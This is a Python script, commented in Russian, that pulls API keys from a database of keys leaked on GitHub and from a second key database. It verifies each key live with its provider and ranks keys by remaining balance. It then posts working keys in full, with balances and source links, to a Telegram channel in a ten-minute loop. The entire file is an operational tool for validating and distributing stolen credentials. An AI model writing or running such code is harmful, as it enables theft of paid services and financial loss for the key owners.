#!/usr/bin/env python3
"""KEY POSTER v3 — только ЦЕННЫЕ живые ключи в TG.

Фильтры шлака:
  - живой ключ подтверждается LIVE-запросом к провайдеру (enrich)
  - баланс <= 0 / долг → НЕ постится
  - мёртвый → НЕ постится
  - приоритет: сначала жирные (баланс $+), потом free-tier с живыми моделями
  - каждый ключ постится ОДИН раз (state)
Loop: python key_poster.py --loop  (каждые 10 мин)
"""
import hashlib
import json
import os
import re
import sqlite3
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, r'C:/Users/User/tmp')
import key_enrich

BOT = os.environ['TG_BOT_TOKEN']
CHAT_ID = int(os.environ.get('TG_CHAT_ID', '0'))
STATE = Path(r'C:/Users/User/tmp/key_poster_state_v3.json')
KH_DB = Path(__file__).resolve().parent.parent / 'data' / 'keys.db'
GAS_DB = Path(r'C:/Users/User/Desktop/Github-API-scan/leaked_keys.db')

# провайдеры, у которых free-ключ без баланса всё равно полезен (модели отвечают)
FREE_OK_PROV = {'OPENROUTER', 'GROQ', 'TAVILY', 'REPLICATE'}


def tg(method, **params):
    url = f'https://api.telegram.org/bot{BOT}/{method}'
    data = json.dumps(params).encode() if params else None
    req = urllib.request.Request(url, data=data,
                                 headers={'Content-Type': 'application/json'} if data else {})
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return json.loads(r.read())
    except Exception as e:
        return {'ok': False, 'error': str(e)}


def load_state():
    try:
        return {'posted': set(json.loads(STATE.read_text())['posted']),
                'rejected': set(json.loads(STATE.read_text()).get('rejected', []))}
    except Exception:
        return {'posted': set(), 'rejected': set()}


def save_state(st):
    STATE.write_text(json.dumps({'posted': sorted(st['posted'])[-30000:],
                                 'rejected': sorted(st['rejected'])[-30000:]}))


def kh_keys():
    out = []
    c = sqlite3.connect(f'file:{KH_DB.as_posix()}?mode=ro', uri=True)
    for prov, val, plan, price, rem in c.execute(
            "SELECT prov, val, plan, price, remaining FROM keys WHERE status IN ('WORKING','FREE')"):
        out.append({'prov': prov, 'key': val, 'plan': plan or '', 'db_bal': price or rem or ''})
    c.close()
    return out


def gas_keys():
    out = []
    c = sqlite3.connect(f'file:{GAS_DB.as_posix()}?mode=ro', uri=True)
    for plat, k, bal, url in c.execute(
            "SELECT platform, api_key, balance_usd, source_url FROM leaked_keys WHERE status IN ('valid','confirmed')"):
        out.append({'prov': plat.upper(), 'key': k, 'plan': '', 'db_bal': f'{bal}' if bal is not None else '', 'src': url or ''})
    c.close()
    return out


def parse_money(s):
    try:
        m = re.search(r'-?\d+\.?\d*', str(s))
        return float(m.group(0)) if m else None
    except Exception:
        return None


def judge(k, e):
    """Return (worthy: bool, reason: str, value_score: float)."""
    prov = k['prov']
    alive = e.get('alive')
    if alive is False:
        return False, 'сдох при проверке', 0
    bal_s = e.get('balance') or ''
    bal = parse_money(bal_s)
    models = e.get('models') or ''

    # баланс из live-энрича
    if bal is not None:
        if bal > 0.5:
            return True, '', bal * 10  # жирный
        if bal <= 0:
            return False, f'баланс {bal}', 0  # долг/ноль = шлак

    # db-баланс как fallback
    db = parse_money(k.get('db_bal'))
    if db is not None:
        if db > 0.5:
            return True, '', db * 10
        if db <= 0 and prov not in FREE_OK_PROV:
            return False, f'баланс {db}', 0

    # free-tier провайдеры: живые модели = ценность
    if prov in FREE_OK_PROV and (models or alive):
        return True, '', 2

    # DeepSeek FREE без баланса — только если модели отвечают
    if prov == 'DEEPSEEK' and models:
        return True, '', 1

    # captcha-сервисы: только положительный баланс (проверен выше)
    if prov in ('TWOCAPTCHA', 'ANTICAPTCHA', 'CAPSOLVER'):
        return False, 'captcha без +баланса', 0

    if alive:
        return True, '', 1  # живой но без данных — один шанс
    return False, 'нет подтверждения жизни', 0


def fmt(k, e, verdict):
    prov = k['prov'].upper()
    lines = [f"🟢 ЖИВОЙ | <b>{prov}</b>"]
    lines.append(f"🔑 <code>{k['key']}</code>")
    if e.get('balance'):
        lines.append(f"💰 Баланс: <b>{e['balance']}</b>")
    elif k.get('db_bal') and parse_money(k.get('db_bal')):
        lines.append(f"💰 Баланс: <b>${parse_money(k['db_bal']):.2f}</b>")
    if e.get('models'):
        lines.append(f"🧠 Модели: <b>{e['models']}</b>")
    if k.get('plan'):
        lines.append(f"📦 План: {k['plan']}")
    if verdict >= 10:
        lines.insert(0, "🔥 ЖИРНЫЙ УЛОВ")
    if k.get('src'):
        lines.append(f"📍 <a href=\"{k['src']}\">источник</a>")
    return '\n'.join(lines)


def one_pass():
    st = load_state()
    allk = kh_keys() + gas_keys()
    cands = []
    for k in allk:
        h = hashlib.sha256(k['key'].encode()).hexdigest()[:12]
        if h in st['posted'] or h in st['rejected']:
            continue
        cands.append((h, k))
    print(f'candidates: {len(cands)} (total {len(allk)})')
    worthy = []
    for h, k in cands[:80]:  # cap per pass to limit API load
        e = key_enrich.enrich(k['prov'], k['key'])
        ok, reason, score = judge(k, e)
        if ok:
            worthy.append((score, h, k, e))
        else:
            st['rejected'].add(h)
            print(f"  reject {k['prov']}: {reason}")
        time.sleep(0.4)
    worthy.sort(key=lambda x: -x[0])
    sent = 0
    for score, h, k, e in worthy[:12]:
        text = fmt(k, e, score)
        r = tg('sendMessage', chat_id=CHAT_ID, text=text, parse_mode='HTML',
               disable_web_page_preview=True)
        if r.get('ok'):
            st['posted'].add(h)
            sent += 1
            time.sleep(1.3)
        else:
            print('send fail:', r)
    save_state(st)
    print(f'posted {sent} worthy (rejected {len(st["rejected"])})')
    return sent


def main():
    if '--loop' in sys.argv:
        while True:
            try:
                one_pass()
            except Exception as e:
                print('err:', e)
            time.sleep(600)
    else:
        one_pass()


if __name__ == '__main__':
    main()
